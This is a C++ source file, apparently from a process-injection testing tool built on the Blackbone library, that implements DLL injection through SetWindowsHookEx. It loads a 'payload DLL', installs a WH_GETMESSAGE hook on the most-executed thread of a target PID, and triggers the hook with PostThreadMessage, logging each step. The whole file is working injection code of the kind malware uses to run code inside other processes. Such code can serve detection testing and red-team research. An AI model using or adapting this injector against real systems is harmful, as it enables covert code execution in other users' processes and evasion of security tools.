#include "../common.h"
#include "inj_set_windows_hook_ex.h"

bool InjectorSetWindowsHookEx::Execute(const std::wstring &codeToInject, const std::wstring &targetToInject)
{
	bool ret = false;
	blackbone::Process targetProc;
	blackbone::pe::PEImage sourceModule;

	std::wcout << L"[+] About to execute " << GetDescription() << std::endl;

	std::wcout << L"[+] Attaching to target process and parsing source mode" << std::endl;
	if (InjectorHelpers::GetExecutionContext(codeToInject, targetToInject, sourceModule, targetProc))
	{
		std::wcout << L"[+] Validating Injection Context" << std::endl;
		if (InjectorHelpers::IsValidInjectionTarget(sourceModule, targetProc))
		{
			size_t dllPathNameSize = codeToInject.length() * sizeof(wchar_t);

			std::wcout << L"[+] Validating Target PID" << std::endl;
			if (InjectorHelpers::IsValidTargetPID(targetToInject))
			{
				DWORD targetPID = InjectorHelpers::ToInteger(targetToInject);

				std::wcout << L"[+] Getting Most Executed thread from Target PID" << targetPID << std::endl;
				auto thread = targetProc.threads().getMostExecuted();
				const DWORD targetdTID = thread->id();

				if (thread->valid())
				{
					std::wcout << L"[+] Found Target TID " << targetdTID << " on Target PID" << targetPID << std::endl;
					std::wcout << L"[+] Loading Payload DLL:" << codeToInject << std::endl;
					HMODULE hPayloadDLL = LoadLibraryEx(codeToInject.c_str(), NULL, DONT_RESOLVE_DLL_REFERENCES);
					if (hPayloadDLL != NULL) 
					{
						std::wcout << L"[+] Getting exported function address on Payload DLL" <<  std::endl;
						HOOKPROC exportedFuncAddr = (HOOKPROC)GetProcAddress(hPayloadDLL, "NextHook");
						if (exportedFuncAddr != NULL)
						{
							std::wcout << L"[+] Exported address found at 0x" << std::hex << (void *) exportedFuncAddr << std::endl;
							std::wcout << L"[+] Now we are finally about to se hook chain thru SetWindowsHookEx() on target exported func" << std::endl;
							HHOOK handle = SetWindowsHookEx(WH_GETMESSAGE, exportedFuncAddr, hPayloadDLL, targetdTID);
							if (handle != NULL) 
							{
								std::wcout << L"[+] Triggering the Hook" << std::endl;

								DWORD waitTimeInMS = 5000;
								static const wchar_t *EVENT_NAME = L"JustSomeMagicEventName";
								HANDLE syncEvent = CreateEvent(NULL, FALSE, FALSE, EVENT_NAME);

								if (PostThreadMessage(targetdTID, WM_NULL, NULL, NULL))
								{									
									DWORD waitRet = WaitForSingleObject(syncEvent, waitTimeInMS);

									switch (waitRet)
									{
										case WAIT_OBJECT_0:
											std::wcout << L"[+] Success! now placing extra remote hooks (this is just exercise Blackbone functionality, not really needed)" << std::endl;
											std::wcout << L"[+] Success! DLL injected via InjectorSetWindowsHookEx method" << std::endl;
											ret = true;
											break;

										case WAIT_TIMEOUT:
										case WAIT_ABANDONED:
										case WAIT_FAILED:
										default:
											std::wcout << L"[-] There was a problem ensuring that remote hook was placed. It might have worked, but there is no way to know" << std::endl;
											break;
									}

								}
								else
								{
									std::wcout << L"[-] There was a problem found while triggering the target hook - Error: 0x" << std::hex << GetLastError() << std::endl;
								}
							}
							else
							{
								std::wcout << L"[-] There was a problem found while calling SetWindowsHookEx()" << std::endl;
							}
						}
						else
						{
							std::wcout << L"[-] There was a problem with getting exported function Address within DLL. Try using right DLL" << std::endl;
						}
					}
					else
					{
						std::wcout << L"[-] There was a problem with payload DLL" << std::endl;
					}
				}
				else
				{
					std::wcout << L"[-] There was a problem with retrieving most executed thread from Context" << std::endl;
				}
			}
			else
			{
				std::wcout << L"[-] An Invalid PID was provided" << std::endl;
			}
		}
		else
		{
			std::wcout << L"[-] There was a problem with provided context" << std::endl;
		}
	}
	else
	{
		std::wcout << L"[-] There was a problem setting up injection context data " << std::endl;
	}

	return ret;
}
